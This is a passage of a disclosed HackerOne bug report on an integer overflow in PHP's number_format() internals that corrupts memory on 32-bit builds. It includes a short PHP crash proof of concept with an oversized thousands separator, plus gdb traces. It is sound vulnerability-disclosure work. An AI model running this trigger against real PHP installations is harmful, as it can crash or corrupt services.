{"id":180562,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1NjI=","url":"https://hackerone.com/reports/180562","title":"Memory corruption in _php_math_number_format_ex()","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-11-07T01:47:13.948Z","submitted_at":"2016-11-07T01:47:13.948Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fosec","url":"/fosec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:21:52.975Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:21:49.528Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The fix of this bug has been committed: https://bugs.php.net/bug.php?id=73336\nDescription:\n--------------\nI have found some vulnerable code at ```_php_math_number_format_ex()``` function. ```_php_math_number_format_ex()``` function is an internal function which is called from ```number_format()``` function. ```number_format()``` function takes in a string and uses it as the thousand separator. If the separator string is too long, it may lead to string overflow.\n\nInside the code of the function itself, there are checks in the *thousand_sep_len* to avoid string overflow:\n\n``` c\nPHPAPI zend_string *_php_math_number_format_ex(double d, int dec, char *dec_point,\n\t\tsize_t dec_point_len, char *thousand_sep, size_t thousand_sep_len)\n{\n....\n    /* allow for thousand separators */\n\tif (thousand_sep) {\n\t\tif (integral + thousand_sep_len * ((integral-1) / 3) \u003c integral) {\n\t\t\t/* overflow */\n\t\t\tphp_error_docref(NULL, E_ERROR, \"String overflow\");\n\t\t}\n\t\tintegral += thousand_sep_len * ((integral-1) / 3);\n\t}\n\n    reslen = integral;\n....\n}\n```\n\nThe problem is that both *integral* variable and *thousand_sep_len* variable are unsigned integers, in 32 bits architectures this means 2^32 - 1 maximum value. So, if we set some appropriate values in *integral* and *thousand_sep_len*, for example: integral = 0x0a and thousand_sep_len = 0x65000000, ```integral + thousand_sep_len * ((integral-1) / 3)``` equals to 0x12F00000a, a result larger than the maximum representable value. In 32 bits architectures, the result will become 0x2F00000a and pass the check.\n\n\nTest script:\n----------------\n``` php\n\u003c?php\nini_set('memory_limit', -1);\n$thousands_sep = str_repeat(\"A\", 0x65000000);\nnumber_format(1234567890, 0, \".\", $thousands_sep);\n?\u003e\n```\nOpen php program in gdb, set a breakpoint at line *1149* in file ```ext/standard/math.c```\n\n```\n[----------------------------------registers-----------------------------------]\nEAX: 0x2f00000a ('\\n')\nEBX: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\nECX: 0xb7da8000 --\u003e 0x1b8d9c\nEDX: 0x2f000000 ('')\nESI: 0x65000000 ('A' \u003crepeats 200 times\u003e...)\nEDI: 0xb7860188 --\u003e 0x848b04e (\u003cZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER\u003e:      push   ebp)\nEBP: 0xbfffbe88 --\u003e 0xbfffbf28 --\u003e 0xbfffbf68 --\u003e 0xbfffbf88 --\u003e 0xbfffbfc8 --\u003e 0xbfffbff8 (--\u003e ...)\nESP: 0xbfffbe30 --\u003e 0x0\nEIP: 0x834d202 (\u003c_php_math_number_format_ex+316\u003e:       cmp    eax,DWORD PTR [ebp-0x18])\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d1fd \u003c_php_math_number_format_ex+311\u003e:  mov    eax,DWORD PTR [ebp-0x18]\n   0x834d200 \u003c_php_math_number_format_ex+314\u003e:  add    eax,edx\n   0x834d202 \u003c_php_math_number_format_ex+316\u003e:  cmp    eax,DWORD PTR [ebp-0x18]\n=\u003e 0x834d205 \u003c_php_math_number_format_ex+319\u003e:  jae    0x834d223 \u003c_php_math_number_format_ex+349\u003e\n | 0x834d207 \u003c_php_math_number_format_ex+321\u003e:  mov    DWORD PTR [esp+0x8],0x89758e9\n | 0x834d20f \u003c_php_math_number_format_ex+329\u003e:  mov    DWORD PTR [esp+0x4],0x1\n | 0x834d217 \u003c_php_math_number_format_ex+337\u003e:  mov    DWORD PTR [esp],0x0\n | 0x834d21e \u003c_php_math_number_format_ex+344\u003e:  call   0x83c1a10 \u003cphp_error_docref0\u003e\n |-\u003e   0x834d223 \u003c_php_math_number_format_ex+349\u003e:      mov    eax,DWORD PTR [ebp-0x18]\n       0x834d226 \u003c_php_math_number_format_ex+352\u003e:      sub    eax,0x1\n       0x834d229 \u003c_php_math_number_format_ex+355\u003e:      mov    edx,0xaaaaaaab\n       0x834d22e \u003c_php_math_number_format_ex+360\u003e:      mul    edx\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --\u003e 0x0\n0004| 0xbfffbe34 --\u003e 0x89758e1 (\"%.*F\")\n0008| 0xbfffbe38 --\u003e 0x0\n0012| 0xbfffbe3c --\u003e 0xb4800000 ('A' \u003crepeats 200 times\u003e...)\n0016| 0xbfffbe40 --\u003e 0x41d26580\n0020| 0xbfffbe44 --\u003e 0x65000014 ('A' \u003crepeats 200 times\u003e...)\n0024| 0xbfffbe48 --\u003e 0xb4800000 ('A' \u003crepeats 200 times\u003e...)\n0028| 0xbfffbe4c --\u003e 0x41d26580\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d202      1150                    if (integral + thousand_sep_len * ((integral-1) / 3) \u003c integral) {\ngdb-peda$\n```\n\n```DWORD PTR [ebp-0x18]``` is *integral* variable and EAX register will hold result of ```integral + thousand_sep_len * ((integral-1) / 3)``` . Because *integral* is lower than 0x2f00000a, *integral* will be updated with 0x2f00000a. *reslen* will be 0x2f00000a. \n\n*reslen* is used as a parameter in ```zend_string_alloc()``` to create a new zend_string object holding formatted string ( reffer at ```ext/standard/math.c:1175``` ):\n``` c\n\tres = zend_string_alloc(reslen, 0);\n```\n\nTwo local variables *s* and *t* are used during format process. They are used to copy numbers to formatted string and add thousand separator every three digits ( reffer at ```ext/standard/math.c:1209``` ):\n```c\n/* copy the numbers before the decimal point, adding thousand\n\t * separator every three digits */\n\twhile (s \u003e= ZSTR_VAL(tmpbuf)) {\n\t\t*t-- = *s--;\n\t\tif (thousand_sep \u0026\u0026 (++count%3)==0 \u0026\u0026 s \u003e= ZSTR_VAL(tmpbuf)) {\n\t\t\tt -= thousand_sep_len;\n\t\t\tmemcpy(t + 1, thousand_sep, thousand_sep_len);\n\t\t}\n}\n```\n\nBecause *thousand_sep_len* is too big,  the result of ```t -= thousand_sep_len;``` is unexpected value.\nIn this example, ```$ebp-0x10``` points to *t*.\n\nBefore\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 ('A' \u003crepeats 200 times\u003e...)\nEBX: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\nEFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3d9 \u003c_php_math_number_format_ex+787\u003e:  ja     0x834d3ff \u003c_php_math_number_format_ex+825\u003e\n   0x834d3db \u003c_php_math_number_format_ex+789\u003e:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de \u003c_php_math_number_format_ex+792\u003e:  neg    eax\n=\u003e 0x834d3e0 \u003c_php_math_number_format_ex+794\u003e:  add    DWORD PTR [ebp-0x10],eax\n   0x834d3e3 \u003c_php_math_number_format_ex+797\u003e:  mov    eax,DWORD PTR [ebp-0x10]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3e0      1213                            t -= thousand_sep_len;\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0x52200016\n```\nAfter:\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 ('A' \u003crepeats 200 times\u003e...)\nEBX: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\n[-------------------------------------code-------------------------------------]\n   0x834d3db \u003c_php_math_number_format_ex+789\u003e:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de \u003c_php_math_number_format_ex+792\u003e:  neg    eax\n   0x834d3e0 \u003c_php_math_number_format_ex+794\u003e:  add    DWORD PTR [ebp-0x10],eax\n=\u003e 0x834d3e3 \u003c_php_math_number_format_ex+797\u003e:  mov    eax,DWORD PTR [ebp-0x10]\n   0x834d3e6 \u003c_php_math_number_format_ex+800\u003e:  lea    edx,[eax+0x1]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, _php_math_number_format_ex (d=1234567890, dec=0x0, dec_point=0xb78012b8 \".\",\n    dec_point_len=0x1, thousand_sep=0x52400010 'A' \u003crepeats 200 times\u003e...,\n    thousand_sep_len=0x65000000) at /root/fuzzer/php7/ext/standard/math.c:1214\n1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0xed200016\n```\n\n0xed200016 is an unusable memory address. \n\n```_php_math_number_format_ex``` function tries to copy thousand separator into formatted string, leads to memory corruption ( reffer at ```ext/standard/math.c:1214``` ):\n``` c\nmemcpy(t + 1, thousand_sep, thousand_sep_len);\n```\n\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\nEBX: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\nECX: 0x0\nEDX: 0xed200017\nESI: 0x65000000 ('A' \u003crepeats 200 times\u003e...)\nEDI: 0xb7860188 --\u003e 0x848b04e (\u003cZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER\u003e:      push   ebp)\nEBP: 0xbfffbe88 --\u003e 0xbfffbf28 --\u003e 0xbfffbf68 --\u003e 0xbfffbf88 --\u003e 0xbfffbfc8 --\u003e 0xbfffbff8 (--\u003e ...)\nESP: 0xbfffbe30 --\u003e 0xed200017\nEIP: 0x834d3fa (\u003c_php_math_number_format_ex+820\u003e:       call   0x80647f0 \u003cmemcpy@plt\u003e)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3f0 \u003c_php_math_number_format_ex+810\u003e:  mov    eax,DWORD PTR [ebp+0x1c]\n   0x834d3f3 \u003c_php_math_number_format_ex+813\u003e:  mov    DWORD PTR [esp+0x4],eax\n   0x834d3f7 \u003c_php_math_number_format_ex+817\u003e:  mov    DWORD PTR [esp],edx\n=\u003e 0x834d3fa \u003c_php_math_number_format_ex+820\u003e:  call   0x80647f0 \u003cmemcpy@plt\u003e\n   0x834d3ff \u003c_php_math_number_format_ex+825\u003e:  mov    eax,DWORD PTR [ebp-0x2c]\n   0x834d402 \u003c_php_math_number_format_ex+828\u003e:  add    eax,0x10\n   0x834d405 \u003c_php_math_number_format_ex+831\u003e:  cmp    eax,DWORD PTR [ebp-0xc]\n   0x834d408 \u003c_php_math_number_format_ex+834\u003e:  jbe    0x834d38e \u003c_php_math_number_format_ex+712\u003e\nGuessed arguments:\narg[0]: 0xed200017\narg[1]: 0x52400010 ('A' \u003crepeats 200 times\u003e...)\narg[2]: 0x65000000 ('A' \u003crepeats 200 times\u003e...)\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --\u003e 0xed200017\n0004| 0xbfffbe34 --\u003e 0x52400010 ('A' \u003crepeats 200 times\u003e...)\n0008| 0xbfffbe38 --\u003e 0x65000000 ('A' \u003crepeats 200 times\u003e...)\n0012| 0xbfffbe3c --\u003e 0xb4800000 ('A' \u003crepeats 200 times\u003e...)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3fa      1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$\n```\n\nExpected result:\n----------------\nNo SIGSEGV\n\nActual result:\n--------------\nSIGSEGV","vulnerability_information_html":"\u003cp\u003eThe fix of this bug has been committed: \u003ca title=\"https://bugs.php.net/bug.php?id=73336\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73336\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73336\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eI have found some vulnerable code at \u003ccode\u003e_php_math_number_format_ex()\u003c/code\u003e function. \u003ccode\u003e_php_math_number_format_ex()\u003c/code\u003e function is an internal function which is called from \u003ccode\u003enumber_format()\u003c/code\u003e function. \u003ccode\u003enumber_format()\u003c/code\u003e function takes in a string and uses it as the thousand separator. If the separator string is too long, it may lead to string overflow.\u003c/p\u003e\n\n\u003cp\u003eInside the code of the function itself, there are checks in the \u003cem\u003ethousand_sep_len\u003c/em\u003e to avoid string overflow:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ePHPAPI\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003e_php_math_number_format_ex\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003edouble\u003c/span\u003e \u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003edec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003edec_point\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003edec_point_len\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ethousand_sep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n    \u003cspan class=\"cm\"\u003e/* allow for thousand separators */\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ethousand_sep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eintegral\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eintegral\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eintegral\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"cm\"\u003e/* overflow */\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ephp_error_docref\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eE_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;String overflow\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eintegral\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eintegral\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ereslen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eintegral\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe problem is that both \u003cem\u003eintegral\u003c/em\u003e variable and \u003cem\u003ethousand_sep_len\u003c/em\u003e variable are unsigned integers, in 32 bits architectures this means 2^32 - 1 maximum value. So, if we set some appropriate values in \u003cem\u003eintegral\u003c/em\u003e and \u003cem\u003ethousand_sep_len\u003c/em\u003e, for example: integral = 0x0a and thousand_sep_len = 0x65000000, \u003ccode\u003eintegral + thousand_sep_len * ((integral-1) / 3)\u003c/code\u003e equals to 0x12F00000a, a result larger than the maximum representable value. In 32 bits architectures, the result will become 0x2F00000a and pass the check.\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eini_set\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;memory_limit\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$thousands_sep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x65000000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003enumber_format\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1234567890\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;.\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$thousands_sep\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOpen php program in gdb, set a breakpoint at line \u003cem\u003e1149\u003c/em\u003e in file \u003ccode\u003eext/standard/math.c\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[----------------------------------registers-----------------------------------]\nEAX: 0x2f00000a (\u0026#39;\\n\u0026#39;)\nEBX: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nECX: 0xb7da8000 --\u0026gt; 0x1b8d9c\nEDX: 0x2f000000 (\u0026#39;\u0026#39;)\nESI: 0x65000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEDI: 0xb7860188 --\u0026gt; 0x848b04e (\u0026lt;ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER\u0026gt;:      push   ebp)\nEBP: 0xbfffbe88 --\u0026gt; 0xbfffbf28 --\u0026gt; 0xbfffbf68 --\u0026gt; 0xbfffbf88 --\u0026gt; 0xbfffbfc8 --\u0026gt; 0xbfffbff8 (--\u0026gt; ...)\nESP: 0xbfffbe30 --\u0026gt; 0x0\nEIP: 0x834d202 (\u0026lt;_php_math_number_format_ex+316\u0026gt;:       cmp    eax,DWORD PTR [ebp-0x18])\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d1fd \u0026lt;_php_math_number_format_ex+311\u0026gt;:  mov    eax,DWORD PTR [ebp-0x18]\n   0x834d200 \u0026lt;_php_math_number_format_ex+314\u0026gt;:  add    eax,edx\n   0x834d202 \u0026lt;_php_math_number_format_ex+316\u0026gt;:  cmp    eax,DWORD PTR [ebp-0x18]\n=\u0026gt; 0x834d205 \u0026lt;_php_math_number_format_ex+319\u0026gt;:  jae    0x834d223 \u0026lt;_php_math_number_format_ex+349\u0026gt;\n | 0x834d207 \u0026lt;_php_math_number_format_ex+321\u0026gt;:  mov    DWORD PTR [esp+0x8],0x89758e9\n | 0x834d20f \u0026lt;_php_math_number_format_ex+329\u0026gt;:  mov    DWORD PTR [esp+0x4],0x1\n | 0x834d217 \u0026lt;_php_math_number_format_ex+337\u0026gt;:  mov    DWORD PTR [esp],0x0\n | 0x834d21e \u0026lt;_php_math_number_format_ex+344\u0026gt;:  call   0x83c1a10 \u0026lt;php_error_docref0\u0026gt;\n |-\u0026gt;   0x834d223 \u0026lt;_php_math_number_format_ex+349\u0026gt;:      mov    eax,DWORD PTR [ebp-0x18]\n       0x834d226 \u0026lt;_php_math_number_format_ex+352\u0026gt;:      sub    eax,0x1\n       0x834d229 \u0026lt;_php_math_number_format_ex+355\u0026gt;:      mov    edx,0xaaaaaaab\n       0x834d22e \u0026lt;_php_math_number_format_ex+360\u0026gt;:      mul    edx\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --\u0026gt; 0x0\n0004| 0xbfffbe34 --\u0026gt; 0x89758e1 (\u0026quot;%.*F\u0026quot;)\n0008| 0xbfffbe38 --\u0026gt; 0x0\n0012| 0xbfffbe3c --\u0026gt; 0xb4800000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0016| 0xbfffbe40 --\u0026gt; 0x41d26580\n0020| 0xbfffbe44 --\u0026gt; 0x65000014 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0024| 0xbfffbe48 --\u0026gt; 0xb4800000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0028| 0xbfffbe4c --\u0026gt; 0x41d26580\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d202      1150                    if (integral + thousand_sep_len * ((integral-1) / 3) \u0026lt; integral) {\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eDWORD PTR [ebp-0x18]\u003c/code\u003e is \u003cem\u003eintegral\u003c/em\u003e variable and EAX register will hold result of \u003ccode\u003eintegral + thousand_sep_len * ((integral-1) / 3)\u003c/code\u003e . Because \u003cem\u003eintegral\u003c/em\u003e is lower than 0x2f00000a, \u003cem\u003eintegral\u003c/em\u003e will be updated with 0x2f00000a. \u003cem\u003ereslen\u003c/em\u003e will be 0x2f00000a. \u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003ereslen\u003c/em\u003e is used as a parameter in \u003ccode\u003ezend_string_alloc()\u003c/code\u003e to create a new zend_string object holding formatted string ( reffer at \u003ccode\u003eext/standard/math.c:1175\u003c/code\u003e ):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e    \u003cspan class=\"n\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereslen\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTwo local variables \u003cem\u003es\u003c/em\u003e and \u003cem\u003et\u003c/em\u003e are used during format process. They are used to copy numbers to formatted string and add thousand separator every three digits ( reffer at \u003ccode\u003eext/standard/math.c:1209\u003c/code\u003e ):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"cm\"\u003e/* copy the numbers before the decimal point, adding thousand\n     * separator every three digits */\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"n\"\u003eZSTR_VAL\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003et\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ethousand_sep\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"n\"\u003eZSTR_VAL\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmpbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e\u003cspan 